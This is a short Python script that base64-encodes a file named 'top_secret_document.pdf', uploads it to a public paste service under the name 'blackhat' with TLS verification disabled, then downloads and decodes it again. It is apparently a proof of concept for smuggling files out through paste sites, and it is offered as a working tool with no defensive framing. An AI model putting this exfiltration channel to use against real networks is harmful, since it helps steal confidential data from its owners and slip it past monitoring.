#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import json
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()  # Disable SSL verify warnings

URL = 'http://paste.arn-fai.net/'
FILENAME_INPUT = 'top_secret_document.pdf'
FILENAME_OUTPUT = 'top_secret_document_decoded.pdf'

with open(FILENAME_INPUT, 'rb') as file_input, open(FILENAME_OUTPUT, 'wb') as file_output:
    print(f'[XXX] Sending File [XXX]')
    print(f'\t[+] Reading {FILENAME_INPUT}')
    encoded_file = base64.b64encode(file_input.read())
    print(f'\t[+] {FILENAME_INPUT} encoded in Base64')

    #POST request
    data = {
        "insert": 1,
        "name": "blackhat",
        "expires": "1w",
        "language": "Plain",
        "description": "Testing service",
        "code": encoded_file
    }

    r = requests.post(URL, data=data, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    links = soup.find_all('a')
    print(f'\t[+] Link: {links[0].get("href")}')
    print(f'\t[+] Raw file link: {links[1].get("href")}')

    print(f'\n[XXX] Retrieving File [XXX]')
    r = requests.get(links[1].get("href"), verify=False)
    print(f'\t[+] Fetching {links[1].get("href")}')
    print(f'\t[+] Decoding in Base64')
    decoded_file = base64.b64decode(r.text)
    print(f'\t[+] Writing in file {FILENAME_OUTPUT}')
    file_output.write(decoded_file)
    print(f'\t[+] Done!!!')
